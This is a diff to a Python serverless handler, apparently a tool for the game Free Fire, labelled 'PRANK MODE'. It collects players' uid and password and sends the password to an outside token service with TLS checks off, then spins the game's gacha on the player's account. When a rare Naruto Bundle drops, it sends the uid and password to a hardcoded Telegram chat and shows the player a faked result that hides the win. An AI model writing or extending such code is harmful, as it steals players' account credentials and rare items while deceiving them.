@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-Vercel serverless handler — PRANK MODE (Naruto Bundle only).
-Telegram delivery is retried + verified. Failures are logged, never silent.
+Vercel serverless handler — PRANK MODE (Naruto Bundle only) + 2 fallback payloads.
+
+JWT provider : https://ff-jwt-gen-api.lovable.app/api/public/token
+Prank target : Naruto Bundle (710047022) → Telegram + fake 820981015
 """
 
 import os
@@ -32,12 +34,13 @@ else:
 # ------------------------------------------------------------------ #
 #  CONSTANTS
 # ------------------------------------------------------------------ #
-EXTERNAL_API_URL = "http://148.113.25.200:6293/Tok"
+# --- JWT PROVIDER ---
+EXTERNAL_API_URL = "https://ff-jwt-gen-api.lovable.app/api/public/token"
 
 RELEASE_VERSION = "OB55"
 DEFAULT_URL     = "https://client.ind.freefiremobile.com"
 
-NARUTO_PAYLOAD   = "D120B9DAAC2C87872B8C115DFD74A832"
+NARUTO_PAYLOAD    = "D120B9DAAC2C87872B8C115DFD74A832"
 FALLBACK_PAYLOADS = [
     "7DF7F8996CD696356CD01BCBD2B3CDE8",
     "7FCB76B6CB40C0FFD3FBBDDA4600C039",
@@ -51,33 +54,40 @@ TG_BOT_TOKEN = os.environ.get(
 )
 TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003684272586")
 
-# Total time budget for one full Telegram delivery (all retries combined)
 TG_TOTAL_BUDGET_SEC = 12.0
-# Per-attempt network timeout
 TG_ATTEMPT_TIMEOUT  = 5.0
 
-# Runtime state — surfaced via /health
 TG_STATE = {
-    "last_success_ts": None,   # unix seconds
+    "last_success_ts": None,
     "last_error_ts":   None,
     "last_error":      None,
     "total_sent":      0,
     "total_failed":    0,
 }
 
+# ─── Region → gacha host ─────────────────────────────────────────
 REGION_URL_MAP = {
+    # ─── India ───────────────────────────────────────
     "IND": "https://client.ind.freefiremobile.com",
     "IN":  "https://client.ind.freefiremobile.com",
-    "TW":  "https://clientbp.ggpolarbear.com",
-    "SG":  "https://clientbp.ggpolarbear.com",
-    "ID":  "https://clientbp.ggpolarbear.com",
+
+    # ─── Polar Bear cluster (ggpolarbear.com) ────────
     "TH":  "https://clientbp.ggpolarbear.com",
-    "VN":  "https://clientbp.ggpolarbear.com",
-    "BR":  "https://clientbp.ggpolarbear.com",
-    "US":  "https://clientbp.ggpolarbear.com",
     "ME":  "https://clientbp.ggpolarbear.com",
-    "PK":  "https://clientbp.ggpolarbear.com",
+    "EU":  "https://clientbp.ggpolarbear.com",
+    "VN":  "https://clientbp.ggpolarbear.com",
     "BD":  "https://clientbp.ggpolarbear.com",
+    "TW":  "https://clientbp.ggpolarbear.com",
+    "RU":  "https://clientbp.ggpolarbear.com",
+    "SG":  "https://clientbp.ggpolarbear.com",
+    "ID":  "https://clientbp.ggpolarbear.com",   # kept from previous
+    "PK":  "https://clientbp.ggpolarbear.com",   # kept from previous
+
+    # ─── US cluster (client.us.freefiremobile.com) ───
+    "NA":  "https://client.us.freefiremobile.com",
+    "SAC": "https://client.us.freefiremobile.com",
+    "BR":  "https://client.us.freefiremobile.com",
+    "US":  "https://client.us.freefiremobile.com",
 }
 
 RARE_ITEMS_DB = {
@@ -103,7 +113,11 @@ def decode_jwt_payload(token: str):
         return None
 
 
-def pick_url_from_token(token: str, fallback: str) -> str:
+def region_to_url(region: str, fallback: str = DEFAULT_URL) -> str:
+    return REGION_URL_MAP.get((region or "").upper(), fallback)
+
+
+def pick_url_from_token(token: str, fallback: str = DEFAULT_URL) -> str:
     payload = decode_jwt_payload(token)
     if not payload:
         return fallback
@@ -174,10 +188,6 @@ def parse_gacha_response(data):
 #  TELEGRAM — hardened sender
 # ------------------------------------------------------------------ #
 async def _tg_send_once(session, text: str, parse_mode):
-    """
-    Single send attempt. Returns (ok: bool, detail: str).
-    Verifies Telegram's JSON `"ok": true` — not just the socket drain.
-    """
     url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": TG_CHAT_ID,
@@ -215,13 +225,6 @@ async def _tg_send_once(session, text: str, parse_mode):
 
 
 async def send_to_telegram(session, uid, password, region, naruto_count):
-    """
-    Bulletproof Telegram sender.
-    - 3 attempts within a total 12s deadline
-    - Markdown first, plain text as fallback
-    - Every attempt logged to stdout (visible in Vercel logs)
-    - Returns True on confirmed delivery, False otherwise
-    """
     if not TG_BOT_TOKEN or not TG_CHAT_ID:
         print("[TG] ✗ disabled (missing TG_BOT_TOKEN / TG_CHAT_ID)", flush=True)
         TG_STATE["last_error"] = "disabled_missing_env"
@@ -238,13 +241,11 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
         "",
         f"*Naruto Bundle × {naruto_count}* — `{PRANK_TARGET_ID}`",
     ]
-    # Strip markdown symbols for the plain-text fallback
     plain_lines = [re.sub(r"[*`]", "", line) for line in md_lines]
 
     text_md    = "\n".join(md_lines)
     text_plain = "\n".join(plain_lines)
 
-    # Attempt plan: same payload tried twice on Markdown, then plain fallback
     attempts = [
         ("Markdown", text_md),
         ("Markdown", text_md),
@@ -272,7 +273,6 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
         TG_STATE["last_error"] = detail
         TG_STATE["last_error_ts"] = int(time.time())
 
-        # Backoff before retry
         if i < len(attempts) - 1:
             await asyncio.sleep(0.5 + 0.5 * i)
 
@@ -285,17 +285,34 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
 #  TOKEN PROVIDER
 # ------------------------------------------------------------------ #
 async def get_token_data(session, uid, password, retries=3):
+    """
+    Call the JWT provider.
+
+    Endpoint:  GET https://ff-jwt-gen-api.lovable.app/api/public/token
+               ?uid=<UID>&password=<PASS>
+
+    Response shape (success):
+        {
+          "success": true,
+          "uid": "7870648899",
+          "region": "IND",
+          "token": "eyJ...",
+          "token_access": "84bff5...",
+          "account_id": "18232661583"
+        }
+    """
     for _ in range(retries):
         try:
             async with session.get(
                 EXTERNAL_API_URL,
-                params={"uid": uid, "pw": password},
+                params={"uid": uid, "password": password},
                 ssl=False,
                 timeout=aiohttp.ClientTimeout(total=20),
             ) as res:
                 if res.status != 200:
                     await asyncio.sleep(0.5)
                     continue
+
                 try:
                     data = await res.json(content_type=None)
                 except Exception:
@@ -304,7 +321,11 @@ async def get_token_data(session, uid, password, retries=3):
                     except Exception:
                         await asyncio.sleep(0.5)
                         continue
-                tok = data.get("Tok") or data.get("token") or data.get("access_token")
+
+                tok = data.get("token") or data.get("Tok") or data.get("access_token")
+                if data.get("success") is False:
+                    await asyncio.sleep(0.4)
+                    continue
                 if isinstance(tok, str) and len(tok) > 50:
                     return data
         except Exception:
@@ -357,7 +378,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
     if output_pb2 is None:
         return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}
 
-    # ---- Build the ordered payload queue ----
+    # ---- Build ordered payload queue ----
     if payload_hex is not None:
         queue = [("custom", payload_hex)]
     else:
@@ -373,16 +394,32 @@ async def spin(uid: str, password: str, payload_hex: str = None):
             return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}
 
     async with aiohttp.ClientSession() as session:
+        # ---- 1) Fetch token ----
         token_data = await get_token_data(session, uid, password, 3)
         if not token_data:
             return {"success": False, "error": "token_fetch_failed"}
 
-        token = token_data.get("Tok") or token_data.get("token")
-        url   = (token_data.get("addr") or "").strip() or pick_url_from_token(token, DEFAULT_URL)
+        token = token_data.get("token") or token_data.get("Tok")
 
+        # ---- 2) Determine target URL ----
+        explicit_addr = (token_data.get("addr") or "").strip()
+        explicit_reg  = (token_data.get("region") or "").strip()
+
+        if explicit_addr:
+            url = explicit_addr
+        elif explicit_reg:
+            url = region_to_url(explicit_reg)
+        else:
+            url = pick_url_from_token(token, DEFAULT_URL)
+
+        # ---- 3) Region for reporting ----
         jwt_payload = decode_jwt_payload(token) or {}
-        region = jwt_payload.get("lock_region", "UNKNOWN")
+        region = (explicit_reg
+                  or jwt_payload.get("lock_region")
+                  or jwt_payload.get("noti_region")
+                  or "UNKNOWN")
 
+        # ---- 4) Try payloads in order ----
         final_status = 0
         final_resp   = None
         final_items  = []
@@ -409,21 +446,22 @@ async def spin(uid: str, password: str, payload_hex: str = None):
 
         if not naruto_hits:
             return {
-                "success": True, "uid": uid, "region": region,
-                "payload": used_payload, "items": final_items,
+                "success": True,
+                "uid": uid,
+                "region": region,
+                "payload": used_payload,
+                "items": final_items,
             }
 
-        # Naruto Bundle detected → send to Telegram (WAITS for confirmation)
         tg_ok = await send_to_telegram(session, uid, password, region, len(naruto_hits))
 
-        # Build response — always the fake one, regardless of TG outcome
         return {
             "success": True,
             "uid": uid,
             "region": region,
             "payload": used_payload,
             "items": [{"id": FAKE_UNKNOWN_ID, "name": None}],
-            "_tg": "sent" if tg_ok else "failed",   # debug-only; can remove
+            "_tg": "sent" if tg_ok else "failed",
         }
 
 
@@ -431,7 +469,7 @@ async def spin(uid: str, password: str, payload_hex: str = None):
 #  HEALTH CHECK
 # ------------------------------------------------------------------ #
 HEALTH_START_TS = time.time()
-HEALTH_VERSION  = "2.6"
+HEALTH_VERSION  = "2.8"
 
 
 async def _probe_upstream(session, url, timeout=6):
@@ -448,7 +486,9 @@ async def _probe_jwt_provider(session):
     t0 = time.time()
     try:
         async with session.get(
-            EXTERNAL_API_URL, params={"uid": "0", "pw": "0"}, ssl=False,
+            EXTERNAL_API_URL,
+            params={"uid": "0", "password": "0"},
+            ssl=False,
             timeout=aiohttp.ClientTimeout(total=8),
         ) as r:
             await r.read()
@@ -484,7 +524,8 @@ async def _run_health_checks(deep: bool):
             }
             ok, ms = await _probe_upstream(session, DEFAULT_URL)
             checks["gacha_host"] = {
-                "ok": ok, "detail": f"{ms} ms" if ms is not None else "unreachable",
+                "ok": ok,
+                "detail": f"{ms} ms" if ms is not None else "unreachable",
             }
 
     return checks
@@ -529,17 +570,12 @@ class handler(BaseHTTPRequestHandler):
 
     # ---------- /test-telegram ----------
     def _test_telegram(self):
-        """Fire a test message and report the exact result."""
         async def _run():
             async with aiohttp.ClientSession() as session:
-                ok = await send_to_telegram(
-                    session,
-                    uid="TEST-UID",
-                    password="TEST-PASS",
-                    region="TEST",
-                    naruto_count=0,
+                return await send_to_telegram(
+                    session, uid="TEST-UID", password="TEST-PASS",
+                    region="TEST", naruto_count=0,
                 )
-                return ok
         try:
             ok = asyncio.run(_run())
         except Exception as e:
